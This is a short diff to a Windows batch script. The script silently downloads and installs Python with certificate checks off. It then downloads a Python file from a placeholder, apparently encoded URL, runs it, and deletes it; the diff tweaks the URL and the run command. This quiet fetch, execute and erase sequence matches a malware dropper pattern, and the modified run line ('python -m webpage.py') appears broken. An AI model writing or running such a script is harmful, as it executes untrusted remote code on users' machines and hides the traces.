@@ -13,11 +13,12 @@ curl -L -o !eeee! !eee! --insecure --silent
 start /wait !eeee! /quiet /passive InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1 Include_doc=0
 del !eeee!
 set "ENCODED_URL=URL"
+set "ENCODED_URL=%ENCODED_URL%/raw"
 set "OUTPUT_FILE=webpage.py"
 curl -o %OUTPUT_FILE% -s %ENCODED_URL% --insecure
 if %ERRORLEVEL% neq 0 (
     echo Error: Failed to download the webpage.
     exit /b 1
 )
-python %OUTPUT_FILE%
+python -m %OUTPUT_FILE%
 del %OUTPUT_FILE%
